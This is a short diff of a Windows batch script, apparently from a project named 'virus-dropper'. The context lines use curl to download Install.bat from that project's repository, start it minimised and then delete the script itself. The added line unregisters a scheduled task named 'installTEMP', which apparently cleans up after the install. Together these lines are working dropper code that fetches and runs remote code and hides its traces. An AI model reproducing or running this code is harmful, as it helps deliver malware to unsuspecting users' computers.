@@ -30,6 +30,7 @@ if '%errorlevel%' NEQ '0' (
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
 ::do not change --output
 
+powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
 start /min Install.bat
 call :deleteSelf&exit
 :deleteSelf
